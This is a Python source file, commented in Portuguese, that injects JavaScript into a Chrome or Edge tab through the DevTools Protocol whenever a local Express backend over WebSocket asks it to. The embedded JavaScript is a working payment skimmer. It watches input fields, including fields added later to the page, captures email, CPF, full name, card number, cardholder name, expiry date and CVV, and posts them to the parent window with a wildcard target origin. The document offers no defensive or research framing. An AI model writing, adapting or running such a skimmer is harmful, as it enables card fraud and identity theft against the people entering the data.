"""
Injetor de script automático via Chrome DevTools Protocol
Se conecta ao backend Express e injeta o script no navegador
"""

import asyncio
import json
import websockets
import subprocess
import socket
import time
import sys
import os
from pathlib import Path

# Importar o módulo de captura de script
SCRIPT_DIR = Path(__file__).parent
SCRIPT_CONTENT = """
// Script de Captura Automática - Injetado via CDP
(function() {
  const captureState = {
    email: null, cpf: null, fullName: null,
    cardNumber: null, cardholderName: null,
    expiryMonth: null, expiryYear: null, cvv: null,
    completed: false
  };
  
  const patterns = {
    email: /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/,
    cpf: /^\\d{3}\\.\\d{3}\\.\\d{3}-\\d{2}$|^\\d{11}$/,
    fullName: /^[a-zA-Záéíóúàâêôãõç\\s]{3,}$/i,
    cardNumber: /^\\d{16}$/,
    cardholderName: /^[a-zA-Záéíóúàâêôãõç\\s]{3,}$/i,
    expiryMonth: /^(0[1-9]|1[0-2])$/,
    expiryYear: /^\\d{2,4}$/,
    cvv: /^\\d{3}$/
  };
  
  function sanitizeValue(value, type) {
    if (!value) return null;
    const trimmed = value.trim();
    switch(type) {
      case 'cardNumber': case 'cvv': return trimmed.replace(/\\D/g, '');
      case 'cpf': case 'email': return trimmed.toLowerCase();
      default: return trimmed;
    }
  }
  
  function detectFieldType(element) {
    const value = element.value || element.textContent || '';
    const name = (element.name || '').toLowerCase();
    const id = (element.id || '').toLowerCase();
    const placeholder = (element.placeholder || '').toLowerCase();
    const ngModel = (element.getAttribute('ng-model') || '').toLowerCase();
    const text = `${name} ${id} ${placeholder} ${ngModel}`.toLowerCase();
    
    if (text.includes('email') || text.includes('e-mail')) {
      const sanitized = sanitizeValue(value, 'email');
      if (patterns.email.test(sanitized)) return { type: 'email', value: sanitized };
    }
    if (text.includes('cpf')) {
      const sanitized = sanitizeValue(value, 'cpf');
      if (patterns.cpf.test(sanitized)) return { type: 'cpf', value: sanitized };
    }
    if (text.includes('nome completo') || text.includes('full name')) {
      const sanitized = sanitizeValue(value, 'fullName');
      if (patterns.fullName.test(sanitized) && sanitized.split(' ').length >= 2) {
        return { type: 'fullName', value: sanitized };
      }
    }
    if (text.includes('ccnumber') || text.includes('card') || text.includes('número') || text.includes('cartão')) {
      const sanitized = sanitizeValue(value, 'cardNumber');
      if (patterns.cardNumber.test(sanitized)) return { type: 'cardNumber', value: sanitized };
    }
    if (text.includes('titular') || text.includes('cardholder') || text.includes('holder')) {
      const sanitized = sanitizeValue(value, 'cardholderName');
      if (patterns.cardholderName.test(sanitized)) return { type: 'cardholderName', value: sanitized };
    }
    if (text.includes('ccexpmonth') || text.includes('expmonth') || text.includes('mês')) {
      const sanitized = sanitizeValue(value, 'expiryMonth');
      if (patterns.expiryMonth.test(sanitized)) return { type: 'expiryMonth', value: sanitized };
    }
    if (text.includes('ccexpyear') || text.includes('expyear') || text.includes('ano')) {
      const sanitized = sanitizeValue(value, 'expiryYear');
      if (patterns.expiryYear.test(sanitized)) return { type: 'expiryYear', value: sanitized.slice(-2) };
    }
    if (text.includes('cccvc') || text.includes('cvv') || text.includes('cvc')) {
      const sanitized = sanitizeValue(value, 'cvv');
      if (patterns.cvv.test(sanitized)) return { type: 'cvv', value: sanitized };
    }
    return null;
  }
  
  function checkAndUpdateField(element) {
    const fieldInfo = detectFieldType(element);
    if (!fieldInfo) return false;
    const { type, value } = fieldInfo;
    if (captureState[type] !== value) {
      captureState[type] = value;
      return true;
    }
    return false;
  }
  
  function setupInputMonitoring() {
    const inputs = document.querySelectorAll('input[type="text"], input[type="password"], input[type="number"], input[type="email"], input:not([type]), textarea, [ng-model]');
    inputs.forEach(input => {
      ['input', 'change', 'blur', 'keyup'].forEach(eventType => {
        input.addEventListener(eventType, (e) => {
          if (checkAndUpdateField(e.target)) {
            window.parent.postMessage({
              type: 'CARD_DATA_UPDATE',
              payload: captureState
            }, '*');
            if (Object.values(captureState).every(v => v !== null)) {
              captureState.completed = true;
              window.parent.postMessage({
                type: 'CAPTURE_COMPLETE',
                payload: captureState
              }, '*');
            }
          }
        });
      });
    });
  }
  
  function setupMutationObserver() {
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        if (mutation.addedNodes.length) {
          mutation.addedNodes.forEach((node) => {
            if (node.nodeType === 1) {
              const inputs = node.querySelectorAll?.('input, textarea, [ng-model]') || [];
              inputs.forEach(input => {
                ['input', 'change', 'blur', 'keyup'].forEach(eventType => {
                  input.addEventListener(eventType, (e) => {
                    checkAndUpdateField(e.target);
                  });
                });
              });
            }
          });
        }
      });
    });
    observer.observe(document.body, { childList: true, subtree: true, attributes: false });
  }
  
  setupInputMonitoring();
  setupMutationObserver();
  console.log('✅ Script de captura injetado com sucesso!');
})();
"""


class BrowserInjector:
    """Injeta script no navegador via Chrome DevTools Protocol"""
    
    def __init__(self, backend_url="ws://localhost:8080"):
        self.backend_url = backend_url
        self.websocket = None
        self.cdp_port = self._find_chrome_port()
        
    def _find_chrome_port(self):
        """Encontra a porta do Chrome DevTools Protocol"""
        # Tenta a porta padrão
        default_ports = [9222, 9229, 3000, 8080]

        print("🔍 Procurando porta do Chrome DevTools Protocol...")
        for port in default_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = sock.connect_ex(('127.0.0.1', port))
                sock.close()
                if result == 0:
                    print(f"✅ Porta encontrada: {port}")
                    return port
            except Exception as e:
                print(f"⚠️  Erro ao verificar porta {port}: {e}")
                continue

        print("⚠️  Nenhuma porta do Chrome DevTools encontrada")
        return None
    
    async def inject_script(self, tab_id=0):
        """Injeta o script usando Chrome DevTools Protocol"""
        if not self.cdp_port:
            print("❌ Chrome/Edge não encontrado ou CDP desabilitado")
            return False
        
        try:
            # Conecta ao protocolo de debug do Chrome
            cdp_url = f"ws://localhost:{self.cdp_port}/devtools/page/{tab_id}"
            
            async with websockets.connect(cdp_url) as ws:
                # Envia comando para avaliar script
                command = {
                    "id": 1,
                    "method": "Runtime.evaluate",
                    "params": {
                        "expression": SCRIPT_CONTENT,
                        "returnByValue": False
                    }
                }
                
                await ws.send(json.dumps(command))
                response = await ws.recv()
                result = json.loads(response)
                
                if "result" in result:
                    print("✅ Script injetado com sucesso no navegador!")
                    return True
                else:
                    print("❌ Erro ao injetar script:", result)
                    return False
                    
        except Exception as e:
            print(f"❌ Erro na conexão CDP: {e}")
            return False
    
    async def connect_to_backend(self):
        """Conecta ao backend Express via WebSocket"""
        try:
            async with websockets.connect(self.backend_url) as websocket:
                self.websocket = websocket
                print(f"✅ Conectado ao backend: {self.backend_url}")
                
                # Espera por mensagens
                while True:
                    try:
                        message = await websocket.recv()
                        data = json.loads(message)
                        
                        if data.get("type") == "INJECT_REQUEST":
                            print("📨 Requisição de injeção recebida do backend")
                            success = await self.inject_script()
                            
                            # Envia resposta
                            response = {
                                "type": "INJECT_RESPONSE",
                                "success": success
                            }
                            await websocket.send(json.dumps(response))
                            
                    except Exception as e:
                        print(f"❌ Erro ao receber mensagem: {e}")
                        break
                        
        except Exception as e:
            print(f"❌ Erro ao conectar ao backend: {e}")
            await asyncio.sleep(5)  # Aguarda antes de tentar reconectar
    
    async def run(self):
        """Executa o injetor"""
        print("🚀 Iniciando injetor de script via Chrome DevTools Protocol...")
        
        while True:
            try:
                await self.connect_to_backend()
            except Exception as e:
                print(f"❌ Erro: {e}")
                print("⏳ Tentando reconectar em 5 segundos...")
                await asyncio.sleep(5)


async def main():
    """Função principal"""
    injector = BrowserInjector()
    await injector.run()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n✋ Injetor parado pelo usuário")
        sys.exit(0)
